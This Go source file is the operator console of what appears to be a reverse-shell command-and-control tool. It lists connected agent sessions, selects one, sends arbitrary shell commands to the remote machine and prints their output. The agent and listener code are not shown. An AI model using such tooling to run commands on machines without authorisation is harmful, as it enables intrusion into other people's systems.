package server

import (
	"bufio"
	"fmt"
	"os"
	"reverse_shell/pkg/protocol"
	"time"

	"strings"

	"go.uber.org/zap"
)

func RunCLI(sessionManager *SessionManager, logger *zap.Logger) {
	fmt.Println("CLI started. Type 'help' for commands.")
	scanner := bufio.NewScanner(os.Stdin)
	var currentSessionID string

	for {
		if currentSessionID != "" {
			fmt.Printf("[%s]> ", currentSessionID[:8])
		} else {
			fmt.Print("> ")
		}

		if !scanner.Scan() {
			return
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		parts := strings.Fields(input)

		switch parts[0] {
		case "help":
			fmt.Println("Available commands:")
			fmt.Println("  sessions               - list sessions")
			fmt.Println("  exec <cmd>             - run command")
			fmt.Println("  use <id>               -  select session")
			fmt.Println("  bg                     - unselect session")
			fmt.Println("  kill <id>              - kill session")
			fmt.Println("  exit                   - quit")
		case "sessions":
			sessions := sessionManager.List()
			if len(sessions) == 0 {
				fmt.Println("No active sessions.")
			} else {
				fmt.Printf("\nActive Sessions (%d):\n", len(sessions))
				fmt.Println("─────────────────────────────────────────────────────────")
				for _, session := range sessions {
					platform := session.Meta["platform"]
					fmt.Printf("  [%s] Agent: %s | Platform: %s | Last: %s\n",
						session.ID[:8],
						session.AgentID[:8],
						platform,
						time.Since(session.LastActive).Round(time.Second))
				}
				fmt.Println("─────────────────────────────────────────────────────────")
			}
		case "exec":
			if currentSessionID == "" {
				fmt.Println("No session selected. Use 'use <id>' to select a session.")
				continue
			}
			if len(parts) < 2 {
				fmt.Println("Usage: exec <cmd>")
			} else {
				command := strings.Join(parts[1:], " ")
				if command == "" {
					fmt.Println("Command cannot be empty.")
					continue
				}
				session, exists := sessionManager.Get(currentSessionID)
				if !exists {
					fmt.Printf("Session %s not found.\n", currentSessionID[:8])
					currentSessionID = ""
					continue
				}
				err := SendCommand(currentSessionID, command, sessionManager, logger)
				if err != nil {
					fmt.Printf("Error sending command: %v\n", err)
					continue
				}
				fmt.Printf("Command sent to session %s: %s\n", currentSessionID[:8], command)
				fmt.Println("Waiting for response...")
				select {
				case resultMsg := <-session.ResultChan:
					if resultMsg.Type == protocol.MsgError {
						fmt.Printf("Error: %s\n", resultMsg.Payload)
					} else {
						fmt.Printf("Output:\n%s\n", resultMsg.Payload)
					}
				case <-time.After(50 * time.Second):
					fmt.Println("Timeout waiting for response.")
				}
			}
		case "use":
			if len(parts) != 2 {
				fmt.Println("Usage: use <id>")
				continue
			} else {
				sessionID := parts[1]
				session, exists := sessionManager.Get(sessionID)
				if !exists {
					fmt.Printf("Session %s not found.\n", sessionID[:8])
					continue
				} else {
					fmt.Printf("Using session %s (AgentID: %s)\n", session.ID[:8], session.AgentID)
					currentSessionID = session.ID
				}
			}
		case "bg":
			if currentSessionID == "" {
				fmt.Println("No session is currently selected.")
			} else {
				fmt.Printf("Unselected session %s.\n", currentSessionID[:8])
				currentSessionID = ""
			}
		case "kill":
			if len(parts) != 2 {
				fmt.Println("Usage: kill <id>")
				continue
			} else {
				sessionID := parts[1]
				session, exists := sessionManager.Get(sessionID)
				if !exists {
					fmt.Printf("Session %s not found.\n", sessionID[:8])
				} else {
					fmt.Printf("Kill session %s (Agent: %s)? [y/N]: ",
						sessionID[:8], session.AgentID[:8])
					var confirm string
					fmt.Scanln(&confirm)
					if strings.ToLower(confirm) == "y" {
						sessionManager.Remove(sessionID)
						fmt.Printf("Session %s killed.\n", sessionID[:8])
						if currentSessionID == sessionID {
							currentSessionID = ""
						}
					} else {
						fmt.Println("Cancelled.")
					}
				}
			}
		case "exit":
			fmt.Println("Exiting CLI.")
			return
		default:
			fmt.Println("Unknown command. Type 'help' for a list of commands.")
		}
	}
}
